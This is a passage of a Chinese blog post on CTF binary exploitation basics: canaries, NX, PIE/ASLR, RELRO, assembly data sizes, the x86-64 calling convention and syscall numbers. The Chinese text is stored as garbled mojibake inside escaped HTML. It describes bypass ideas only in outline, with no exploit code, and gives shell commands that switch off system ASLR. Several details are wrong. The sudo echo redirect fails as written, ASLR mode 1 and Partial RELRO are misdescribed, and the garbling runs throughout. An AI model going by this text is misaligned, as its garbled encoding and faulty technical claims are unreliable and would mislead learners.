&lt;p&gt;ç”±äºcanaryå¼€å¤´å­—èŠ‚ä¸ºx00ï¼Œæ‰€ä»¥é€šå¸¸æƒ…å†µä¸‹ä¸èƒ½è¢«æ‰“å°å‡ºæ¥ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;é€šå¸¸æƒ…å†µä¸‹ï¼Œç¨‹åºå¦‚æœå¼€å¯äº†canaryä¿æŠ¤ï¼Œå¤§æ¦‚ç‡è¯´æ˜è¿™é“é¢˜ç›®ä¸æ˜¯æ ˆæº¢å‡ºé¢˜ç›®äº†ã€‚å½“ç„¶ä¹Ÿè¦å…·ä½“æƒ…å†µå…·ä½“åˆ†æã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;blockquote class=&#34;alert alert-error&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;ç»•è¿‡æ–¹æ³•ä¸»è¦å°±æ˜¯ä¿®æ”¹canaryæˆ–è€…æ³„æ¼canary&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;æ³„æ¼ canaryï¼šåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€æ ˆæº¢å‡º + è¾“å‡ºåŠŸèƒ½ç­‰æ¼æ´ï¼Œè¯»å–æ ˆä¸Šçš„ canary å€¼ï¼ˆæ³¨æ„é¦–å­—èŠ‚ \x00 çš„å½±å“ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹ canaryï¼šç”¨æ³„æ¼çš„ canary å€¼ï¼Œåœ¨æ ˆæº¢å‡ºæ—¶è¦†ç›–æ ˆä¸Šçš„ canaryï¼Œä½¿å…¶ä¸åŸå§‹å€¼ï¼ˆfs:0x28 å¤„ï¼‰ä¸€è‡´ï¼Œç»•è¿‡æ£€æŸ¥ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;nx&#34;&gt;NX
&lt;/h3&gt;&lt;p&gt;NXæ„æ€å°±æ˜¯Not Executableï¼Œå¼€å¯è¿™ä¸ªä¿æŠ¤åï¼Œç¨‹åºä¸­çš„å †ã€æ ˆã€bssæ®µç­‰ç­‰å¯å†™çš„æ®µå°±&lt;em&gt;ä¸å¯ä»¥æ‰§è¡Œ&lt;/em&gt;ã€‚è¿™å°±æ„å‘³ç€å¦‚æœå¼€å¯äº†NXä¿æŠ¤ï¼Œé€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬å°±ä¸èƒ½æ‰§è¡Œæˆ‘ä»¬è‡ªå·±ç¼–å†™çš„shellcodeã€‚&lt;/p&gt;
&lt;p&gt;ç»•è¿‡çš„æ–¹å¼é€šå¸¸æ˜¯ç”¨mprotectå‡½æ•°æ¥æ”¹å†™æ®µçš„æƒé™ï¼Œnxä¿æŠ¤å¯¹äºropæˆ–è€…åŠ«æŒgotè¡¨åˆ©ç”¨æ–¹å¼ä¸å½±å“ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pieå’Œaslr&#34;&gt;PIEå’ŒASLR
&lt;/h3&gt;&lt;p&gt;åœ¨æˆ‘ä»¬ç¼–å†™ROPæˆ–è€…shellcodeæ—¶ï¼Œæœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ç»•ä¸å¼€çš„ï¼Œé‚£å°±æ˜¯æ‰¾åˆ°å‡½æ•°åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;PIEæŒ‡çš„å°±æ˜¯ç¨‹åºå†…å­˜åŠ è½½åŸºåœ°å€éšæœºåŒ–ï¼Œæ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ä¸€ä¸‹å­ç¡®å®šç¨‹åºçš„åŸºåœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;ASLRä¸PIEå¤§åŒå°å¼‚ï¼ŒASLRæ˜¯ç¨‹åºè¿è¡ŒåŠ¨æ€é“¾æ¥åº“ã€æ ˆç­‰åœ°å€éšæœºåŒ–ã€‚&lt;/p&gt;
&lt;p&gt;é€šå¸¸æ¥è¯´ï¼ŒCTFä¸­çš„PWNé¢˜ä¸è¿™ä¸¤ä¸ªä¿æŠ¤æ‰“äº¤é“çš„æ¬¡æ•°æœ€å¤šã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;ç»•è¿‡æ–¹å¼å°±æ˜¯æ³„éœ²å‡½æ•°åœ°å€ï¼Œç„¶åé€šè¿‡å‡½æ•°çš„åç§»æ¥ç¡®å®šåŸºåœ°å€ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PIE&lt;/strong&gt;ï¼šæ˜¯é’ˆå¯¹&lt;strong&gt;å¯æ‰§è¡Œæ–‡ä»¶æœ¬èº«&lt;/strong&gt;çš„ç¼–è¯‘é€‰é¡¹ã€‚å¼€å¯åï¼Œå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆELFï¼‰ä¼šè¢«åŠ è½½åˆ°å†…å­˜ä¸­çš„éšæœºåœ°å€ï¼Œå…¶å†…éƒ¨çš„ä»£ç æ®µã€æ•°æ®æ®µç­‰ä½ç½®ä¸å†æ˜¯å›ºå®šå€¼ï¼ˆç¼–è¯‘æ—¶ä¸æŒ‡å®šç»å¯¹åœ°å€ï¼Œè€Œæ˜¯ç”¨ç›¸å¯¹åç§»ï¼‰ã€‚
ä½œç”¨ï¼šè®©æ”»å‡»è€…æ— æ³•é¢„å…ˆçŸ¥é“ç¨‹åºä»£ç ã€å…¨å±€å˜é‡ç­‰åœ¨å†…å­˜ä¸­çš„ç»å¯¹åœ°å€ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ASLR&lt;/strong&gt;ï¼šæ˜¯&lt;strong&gt;æ“ä½œç³»ç»Ÿçº§åˆ«çš„ä¿æŠ¤æœºåˆ¶&lt;/strong&gt;ã€‚å¼€å¯åï¼Œæ“ä½œç³»ç»Ÿä¼šéšæœºåŒ–è¿›ç¨‹çš„å†…å­˜å¸ƒå±€ï¼ŒåŒ…æ‹¬å…±äº«åº“ï¼ˆ.soï¼‰çš„åŠ è½½åœ°å€ã€æ ˆã€å †ã€å†…æ ¸æ˜ å°„åŒºåŸŸç­‰çš„èµ·å§‹åœ°å€ã€‚
ä½œç”¨ï¼šè®©æ”»å‡»è€…æ— æ³•é¢„æµ‹å…±äº«åº“å‡½æ•°ï¼ˆå¦‚ libc ä¸­çš„ systemï¼‰ã€æ ˆ / å †æ•°æ®çš„å†…å­˜åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;è¯¥æ–‡ä»¶åªæœ‰ 3 ç§åˆæ³•å–å€¼ï¼Œåˆ†åˆ«å¯¹åº”ä¸åŒçš„ ASLR ç­–ç•¥ï¼Œå…·ä½“å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;å–å€¼&lt;/th&gt;
          &lt;th&gt;åç§°&lt;/th&gt;
          &lt;th&gt;ä½œç”¨ï¼ˆéšæœºåŒ–èŒƒå›´ï¼‰&lt;/th&gt;
          &lt;th&gt;å®‰å…¨å¼ºåº¦&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;å…³é—­ASLR&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;å®Œå…¨ä¸éšæœºåŒ–&lt;/strong&gt;ï¼šæ ˆã€å †ã€å…±äº«åº“ã€å†…æ ¸ç©ºé—´çš„åœ°å€æ¯æ¬¡è¿è¡Œéƒ½å›ºå®šä¸å˜ã€‚&lt;/td&gt;
          &lt;td&gt;æœ€ä½&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;éƒ¨åˆ†éšæœºåŒ–ï¼ˆé»˜è®¤ï¼‰&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;éƒ¨åˆ†åŒºåŸŸéšæœº&lt;/strong&gt;ï¼šæ ˆåœ°å€ã€VDSOï¼ˆè™šæ‹ŸåŠ¨æ€å…±äº«å¯¹è±¡ï¼‰åœ°å€éšæœºåŒ–ï¼›å †ã€å…±äº«åº“åœ°å€ä¸éšæœºã€‚&lt;/td&gt;
          &lt;td&gt;ä¸­ç­‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;å®Œå…¨éšæœºåŒ–&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;å…¨åŒºåŸŸéšæœº&lt;/strong&gt;ï¼šæ ˆã€å †ã€å…±äº«åº“ã€VDSO åœ°å€å…¨éƒ¨éšæœºåŒ–ï¼›64 ä½ç³»ç»Ÿè¿˜ä¼šéšæœºåŒ–å†…æ ¸ç©ºé—´ã€‚&lt;/td&gt;
          &lt;td&gt;æœ€é«˜&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;1ï¼‰æŸ¥çœ‹å½“å‰ ASLR çŠ¶æ€&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¾“å‡º 0/1/2 ä¸­çš„ä¸€ä¸ª&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /proc/sys/kernel/randomize_va_space
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ï¼ˆ2ï¼‰&lt;strong&gt;ä¸´æ—¶&lt;/strong&gt;ä¿®æ”¹ ASLR å¼ºåº¦&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 1. å…³é—­ ASLR&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 2. æ¢å¤é»˜è®¤éƒ¨åˆ†éšæœºåŒ–&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 3. å¼€å¯å®Œå…¨éšæœºåŒ–ï¼ˆé«˜å®‰å…¨éœ€æ±‚ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;â€‹&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å…³è”&lt;/strong&gt;ï¼šä¸¤è€…é€šå¸¸é…åˆä½¿ç”¨ â€”â€”PIE è®©å¯æ‰§è¡Œæ–‡ä»¶æœ¬èº«åœ°å€éšæœºåŒ–ï¼ŒASLR è®©ç³»ç»Ÿå…¶ä»–å†…å­˜åŒºåŸŸéšæœºåŒ–ï¼Œå…±åŒå¢åŠ å†…å­˜åœ°å€é¢„æµ‹éš¾åº¦ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åŒºåˆ«æ ¸å¿ƒ&lt;/strong&gt;ï¼šPIE æ˜¯ç¼–è¯‘æ—¶å†³å®šçš„ç¨‹åºå±æ€§ï¼ŒASLR æ˜¯ç³»ç»Ÿè¿è¡Œæ—¶çš„å¸ƒå±€ç­–ç•¥ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;é€šä¿—ç‚¹ç†è§£ï¼š&lt;/p&gt;
&lt;p&gt;ASLR æ˜¯æ“ä½œç³»ç»Ÿæçš„ â€œæ•´ä½“å¤§æ´—ç‰Œâ€ï¼šæ¯æ¬¡ç¨‹åºè¿è¡Œæ—¶ï¼Œç³»ç»Ÿä¼šæŠŠæ•´ä¸ªå†…å­˜ç©ºé—´çš„å¸ƒå±€ï¼ˆæ¯”å¦‚å…±äº«åº“æ”¾å“ªã€æ ˆå’Œå †ä»å“ªå¼€å§‹ï¼‰éšæœºæ¢ä¸ªä½ç½®ï¼Œè®©æ”»å‡»è€…çŒœä¸åˆ°å¸¸ç”¨å‡½æ•°ï¼ˆæ¯”å¦‚ systemï¼‰æˆ–æ•°æ®çš„å…·ä½“åœ°å€ã€‚
ASLR åƒæ¯æ¬¡å¼€æ¼”å”±ä¼šæ—¶ï¼Œåœºé¦†é‡Œçš„åº§ä½åŒºï¼ˆå…±äº«åº“ï¼‰ã€åå°ï¼ˆå †ï¼‰ã€è§‚ä¼—å…¥å£ï¼ˆæ ˆï¼‰çš„ä½ç½®éƒ½éšæœºæ¢ã€‚&lt;/p&gt;
&lt;p&gt;PIE æ˜¯é’ˆå¯¹å•ä¸ªç¨‹åºçš„ â€œè‡ªèº«éšæœºåŒ–â€ï¼šå¦‚æœç¨‹åºç¼–è¯‘æ—¶å¼€äº† PIEï¼Œå®ƒè‡ªå·±åŠ è½½åˆ°å†…å­˜æ—¶ï¼Œä»£ç å’Œæ•°æ®ä¼šéšæœºæ”¾åœ¨ä¸€ä¸ªä¸ç¡®å®šçš„ä½ç½®ï¼ˆè€Œä¸æ˜¯å›ºå®šåœ°å€ï¼‰ï¼Œè®©æ”»å‡»è€…è¿ç¨‹åºè‡ªå·±çš„å‡½æ•°ã€å˜é‡åœ¨å“ªéƒ½çŒœä¸å‡†ã€‚
PIE åƒæ¼”å‡ºå›¢é˜Ÿï¼ˆç¨‹åºæœ¬èº«ï¼‰æ¯æ¬¡ä¸Šåœºæ—¶ï¼Œè‡ªå·±çš„ç«™ä½ï¼ˆä»£ç å’Œæ•°æ®ï¼‰ä¹Ÿéšæœºå˜ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;relro&#34;&gt;RELRO
&lt;/h3&gt;&lt;p&gt;RELROï¼ˆRelocation Read-Onlyï¼Œé‡å®šä½åªè¯»ï¼‰æ˜¯ä¸€ç§é’ˆå¯¹ ELF æ–‡ä»¶é‡å®šä½è¡¨çš„ä¿æŠ¤æœºåˆ¶ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯&lt;strong&gt;é™åˆ¶å¯¹ GOTï¼ˆå…¨å±€åç§»è¡¨ï¼‰ç­‰é‡å®šä½ç›¸å…³åŒºåŸŸçš„ä¿®æ”¹æƒé™&lt;/strong&gt;ï¼Œé˜²æ­¢æ”»å‡»è€…é€šè¿‡ç¯¡æ”¹ GOT è¡¨å®ç°å‡½æ•°åŠ«æŒï¼ˆå¦‚ä¿®æ”¹&lt;code&gt;printf&lt;/code&gt;çš„ GOT æ¡ç›®ä¸º&lt;code&gt;system&lt;/code&gt;åœ°å€ï¼‰ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™ä¸ªä¿æŠ¤ä¸»è¦é’ˆå¯¹çš„æ˜¯å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæ„æ€å°±æ˜¯è¯´gotè¡¨è¿™ç§å’Œå‡½æ•°åŠ¨æ€é“¾æ¥ç›¸å…³çš„å†…å­˜åœ°å€ï¼Œå¯¹äºç”¨æˆ·æ˜¯åªè¯»çš„ã€‚&lt;/p&gt;
&lt;p&gt;å¼€å¯äº†è¿™ä¸ªä¿æŠ¤ï¼Œæ„å‘³ç€æˆ‘ä»¬ä¸èƒ½&lt;em&gt;&lt;strong&gt;åŠ«æŒ&lt;/strong&gt;&lt;/em&gt;gotè¡¨ä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;RELRO çš„ä¸¤ç§æ¨¡å¼åŠä½œç”¨:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Partial RELROï¼ˆéƒ¨åˆ† RELROï¼‰&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä»…å°† GOT è¡¨çš„å‰åŠéƒ¨åˆ†ï¼ˆ.got.pltï¼‰è®¾ç½®ä¸ºåªè¯»ï¼ŒååŠéƒ¨åˆ†ä»å¯å†™ã€‚
ä½œç”¨ï¼šåŸºæœ¬é˜²æ­¢å¯¹å·²è§£æçš„å‡½æ•°åœ°å€ï¼ˆGOT è¡¨ä¸­å·²å¡«å……çš„æ¡ç›®ï¼‰è¿›è¡Œä¿®æ”¹ï¼Œä½†ä»æœ‰ä¸€å®šå®‰å…¨éšæ‚£ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Full RELROï¼ˆå®Œå…¨ RELROï¼‰&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å°†æ•´ä¸ª GOT è¡¨ï¼ˆåŒ…æ‹¬.dynamic ç­‰é‡å®šä½ç›¸å…³æ®µï¼‰è®¾ç½®ä¸ºåªè¯»ï¼Œå¹¶åœ¨ç¨‹åºå¯åŠ¨æ—¶æå‰è§£ææ‰€æœ‰åŠ¨æ€é“¾æ¥ç¬¦å·ï¼ˆå…³é—­å»¶è¿Ÿç»‘å®šï¼‰ã€‚
ä½œç”¨ï¼šå½»åº•é˜»æ­¢å¯¹ GOT è¡¨çš„ä¿®æ”¹ï¼ŒåŒæ—¶æ¶ˆé™¤å»¶è¿Ÿç»‘å®šå¯èƒ½å¸¦æ¥çš„æ¼æ´ï¼ˆå¦‚ PLT è¡¨åŠ«æŒï¼‰ï¼Œä½†ä¼š&lt;em&gt;ç•¥å¾®å¢åŠ ç¨‹åºå¯åŠ¨æ—¶é—´&lt;/em&gt;ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ€»ç»“&#34;&gt;æ€»ç»“
&lt;/h2&gt;&lt;p&gt;ä»¥ä¸Šå°±æ˜¯å…­å¤§ç« èŠ‚ï¼Œå› ä¸ºæ„Ÿè§‰å­¦ç€æ¯ä¸€ç« å…³ç³»å¥½åƒä¸æ˜¯å¾ˆå¤§ï¼Œå‰é¢elfåé¢åˆæ¥ä¸ªLinuxä¿æŠ¤æœºåˆ¶ï¼Œæ„Ÿè§‰å¾ˆè„±èŠ‚ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘çš„ç¬”å½•å­˜åœ¨ä¸è¶³ï¼Œå¦‚æœä½ ä»¬çœ‹åˆ°è¿™é‡Œåˆé—®é¢˜çš„è¯ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµï¼ŒBloggerä¼šçœ‹åˆ°çš„ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;åœ¨è¿™é‡Œæ€»ç»“ä¸‹ï¼š&lt;/p&gt;
&lt;h3 id=&#34;æ±‡ç¼–è¯­è¨€&#34;&gt;æ±‡ç¼–è¯­è¨€
&lt;/h3&gt;&lt;p&gt;è®²äº†äº›é‡è¯ï¼š&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;åç§°&lt;/th&gt;
          &lt;th&gt;ç¿»è¯‘&lt;/th&gt;
          &lt;th&gt;å¤§å°&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;bit&lt;/td&gt;
          &lt;td&gt;æ¯”ç‰¹&lt;/td&gt;
          &lt;td&gt;1ä½ï¼ˆ1bï¼‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;byte&lt;/td&gt;
          &lt;td&gt;å­—èŠ‚&lt;/td&gt;
          &lt;td&gt;8ä½ï¼ˆ1Bï¼‰&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;word&lt;/td&gt;
          &lt;td&gt;å­—&lt;/td&gt;
          &lt;td&gt;16ä½&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;dword&lt;/td&gt;
          &lt;td&gt;åŒå­—&lt;/td&gt;
          &lt;td&gt;32ä½&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;qword&lt;/td&gt;
          &lt;td&gt;å››å­—&lt;/td&gt;
          &lt;td&gt;64ä½&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;æ±‡ç¼–è¯­è¨€å°±æ˜¯æœºå™¨ç çš„ä¸€ä¸ªåŠ©è®°ç¬¦ï¼Œä¸ºäº†è®©äººèƒ½çœ‹æ‡‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæœ‰ä¸€äº›å¸¸è§å¯„å­˜å™¨ç§ç±»éœ€è¦å»äº†è§£çš„ï¼Œç¯‡å¹…å¤ªé•¿ï¼Œå¯ä»¥å›åˆ°ä¸Šé¢å»çœ‹ï¼šRBPæ ˆåº•æŒ‡é’ˆã€RAX-R15é€šç”¨å¯„å­˜å™¨ã€RSPæ ˆé¡¶æŒ‡é’ˆã€EFLAGSæ ‡å¿—å¯„å­˜å™¨ã€RIPæŒ‡ä»¤è®¡æ•°å™¨&amp;hellip;&amp;hellip;ï¼›å„ç§å„æ ·çš„&lt;strong&gt;å¯»å€æ–¹å¼&lt;/strong&gt;&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;æ›´é‡è¦çš„æ˜¯è®¤è¯†äº†ä¸€é—¨è¯­è¨€ï¼šæ±‡ç¼–è¯­è¨€ï¼›åˆæ­¥äº†è§£ä¸€äº›æ±‡ç¼–æŒ‡ä»¤ï¼Œå¦‚æ“ä½œç ã€æŒ‡ä»¤ç±»å‹ã€&lt;em&gt;å®ä¾‹å’ŒCè¯­è¨€è¿è¡Œå¾—åˆ°æ•ˆæœæ¯”è¾ƒ&lt;/em&gt;&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æº¢å‡º&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;linuxåŸºç¡€-1&#34;&gt;LinuxåŸºç¡€
&lt;/h3&gt;&lt;p&gt;åˆæ­¥äº†è§£Linuxçš„åŸºæœ¬å†…å®¹ï¼Œä¿æŠ¤å±‚çº§ringã€æ–‡ä»¶æè¿°ç¬¦ã€åŠLinuxè®¡ç®—æœºå†…éƒ¨çš„&lt;strong&gt;å¤§ç«¯å°ç«¯åº&lt;/strong&gt;å­˜å‚¨å½¢å¼&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å¤§ç«¯åºï¼šæ•°æ®é«˜ä½å­˜å‚¨åœ¨è®¡ç®—æœºåœ°å€çš„ä½ä½ï¼Œæ•°æ®ä½ä½å­˜å‚¨åœ¨åœ°å€çš„é«˜ä½ã€‚&lt;/p&gt;
&lt;p&gt;å°ç«¯åºï¼šæ•°æ®é«˜ä½å­˜å‚¨åœ¨è®¡ç®—æœºåœ°å€çš„é«˜ä½ï¼Œæ•°æ®ä½ä½å­˜å‚¨åœ¨åœ°å€çš„ä½ä½ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;åˆæ­¥è®¤è¯†æ ˆçš„å®šä¹‰ã€ä½œç”¨ã€åœ¨PWNæ‰€å‘æŒ¥çš„å¨åŠ›ã€‚&lt;/p&gt;
&lt;h3 id=&#34;è°ƒç”¨çº¦å®š-2&#34;&gt;è°ƒç”¨çº¦å®š
&lt;/h3&gt;&lt;p&gt;è¿™é‡Œé‡è¦çš„æ˜¯å‡½æ•°è°ƒç”¨æµç¨‹ï¼Œé‡ç‚¹è®²è§£pushã€popã€callã€retã€jmpç­‰æ±‡ç¼–æŒ‡ä»¤çš„ä½¿ç”¨æ•ˆæœã€‚&lt;/p&gt;
&lt;p&gt;å­¦ä¹ è°ƒç”¨çº¦å®šï¼šè¿”å›å€¼ï¼šä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ä¼šå­˜å‚¨åˆ°RAXå¯„å­˜å™¨ã€‚&lt;/p&gt;
&lt;p&gt;X86-64å‡½æ•°çš„è°ƒç”¨çº¦å®šä¸ºï¼šä»å·¦è‡³å³å‚æ•°ä¸€æ¬¡ä¼ é€’ç»™rdiï¼Œrsiï¼Œrdxï¼Œrcxï¼Œr8ï¼Œr9ã€‚å¦‚æœä¸€ä¸ªå‡½æ•°çš„å‚æ•°å¤šäº6ä¸ªï¼Œåˆ™ä»å³è‡³å·¦å‹å…¥æ ˆä¸­ä¼ é€’ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç³»ç»Ÿè°ƒç”¨&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;è°ƒç”¨å·ç &lt;/th&gt;
          &lt;th&gt;åç§°&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;read&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;write&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;open&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;close&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;9&lt;/td&gt;
          &lt;td&gt;mmap&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;37&lt;/td&gt;
          &lt;td&gt;alarm&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;60&lt;/td&gt;
          &lt;td&gt;exit&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;62&lt;/td&gt;
          &lt;td&gt;kill&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;59&lt;/td&gt;
          &lt;td&gt;execv&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;elfæ–‡ä»¶-1&#34;&gt;ELFæ–‡ä»¶
